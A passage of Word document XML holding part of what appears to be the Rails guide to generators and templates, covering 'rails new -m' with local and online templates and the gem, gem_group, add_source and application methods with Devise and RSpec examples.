              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>model_name.blank?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79BB1492" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  generate("devise", model_name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19110B52" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="20E35242" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the above template we specify that the application relies on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rspec-rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cucumber-rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gem so these two will be added to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> group in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Then we pose a question to the user about whether or not they would like to install Devise. If the user replies “y” or “yes” to this question, then the template will add Devise to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> outside of any group and then runs the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>devise:install</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> generator. This template then takes the users input and runs the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>devise</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> generator, with the user’s answer from the last question being passed to this generator.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD7698B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Imagine that this template was in a file called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>template.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. We can use it to modify the outcome of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails new</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>-m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option and passing in the filename:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3720"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="64236124" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21F8E2D9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="887649004"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails new thud -m template.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C5298C4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This command will generate the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Thud</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> application, and then apply the template to the generated output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47BB6641" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Templates don’t have to be stored on the local system, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>-m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option also supports online templates:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5388"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="110EDD42" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B4E974A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1453206052"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">$ rails new thud -m </w:t>
            </w:r>
            <w:hyperlink r:id="rId1156" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>https://gist.github.com/722911.txt</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="024AEBB2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Whilst the final section of this guide doesn’t cover how to generate the most awesome template known to man, it will take you through the methods available at your disposal so that you can develop it yourself. These same methods are also available for generators.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F40C06B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>9 Generator methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4222778E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The following are methods available for both generators and templates for Rails.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F515349" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Methods provided by Thor are not covered this guide and can be found in </w:t>
      </w:r>
      <w:hyperlink r:id="rId1157" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Thor’s documentation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2DF4E30C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>gem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B720CC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Specifies a gem dependency of the application.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5975"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="39E8AF54" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A71F8FE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem("rspec", :group</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "test", :version</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "2.1.0")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6169FBAB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem("devise", "1.1.5")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E9B0C0C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Available options are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D29FCBB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="369"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:group</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – The group in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> where this gem should go.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED159A4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="369"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – The version string of the gem you want to use. Can also be specified as the second argument to the method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6068BBE6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="369"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:git</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the git repository for this gem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFD3FCC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Any additional options passed to this method are put on the end of the line:</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335E5E0D" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A853567" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="85662320"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem("devise", :git</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "</w:t>
            </w:r>
            <w:hyperlink r:id="rId1158" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>git://github.com/plataformatec/devise</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>", :branch</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "master")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="464AE3F3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The above code will put the following line into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="258EA742" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4217C934" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="2104494114"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem "devise", :git</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "</w:t>
            </w:r>
            <w:hyperlink r:id="rId1159" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>git://github.com/plataformatec/devise</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>", :branch</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "master"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6CB360DF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>gem_group</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3898394F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Wraps gem entries inside a group:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3768"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="1523C67D" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42DB4D90" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem_group :development, :test</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="723B5A30" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  gem "rspec-rails"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69FFCB36" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="18826428" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>add_source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D491597" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Adds a specified source to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3615"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="1C4DC7B4" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57CE317F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="540559564"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>add_source "</w:t>
            </w:r>
            <w:hyperlink r:id="rId1160" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://gems.github.com</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6EF313D0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4C0114" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Adds a line to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directly after the application class definition.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6047"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="54BF3E83" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44D25979" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1705330764"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>application "config.asset_host = '</w:t>
            </w:r>
            <w:hyperlink r:id="rId1161" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://example.com</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="47CE1356" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method can also take a block:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
